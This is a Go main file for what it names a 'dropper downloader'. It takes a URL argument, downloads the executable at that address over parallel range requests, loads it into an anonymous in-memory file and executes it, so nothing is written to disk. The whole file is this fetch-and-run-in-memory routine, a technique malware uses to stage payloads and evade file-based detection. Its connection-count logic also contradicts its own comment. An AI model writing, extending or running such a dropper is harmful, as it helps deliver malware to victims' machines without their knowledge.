package main

import (
	"fmt"
	"os"
)


func logExit(err error){
	if err != nil {
		fmt.Printf("error %v\n", err)
		os.Exit(-1)
	}
} 

func main() {
	if len(os.Args) < 2 {
		logExit(fmt.Errorf("provide executable url"))
	}
	
	dd := newDropperDownloader()

	if !validateURL(os.Args[1]) {
		logExit(fmt.Errorf("provided executable url is invalid"))
	}
	
	dd.uri = os.Args[1]
	rangeIsSupported, err := dd.isRangeSupported()
	logExit(err)

	if rangeIsSupported {
		// decide on number of connection
		// do not get greedy		
		// 500KB - 50MB => 10 connections
		// 50MB - infinity => 30 connections
		// programs should not be that big anyway
		if dd.contentLength > (0.5 * 1024 * 1024) {
			dd.numConnections = 30
		} else {
			dd.numConnections = 10
		}

		
	} else {
		dd.numConnections = 1
	}

	data, err := dd.process()
	logExit(err)

	fd, err := memfdCreate("./prog.bin")
	logExit(err)
	
	err = copyToMem(fd, data)
	logExit(err)

	err = execveAt(fd)
	logExit(err)
}
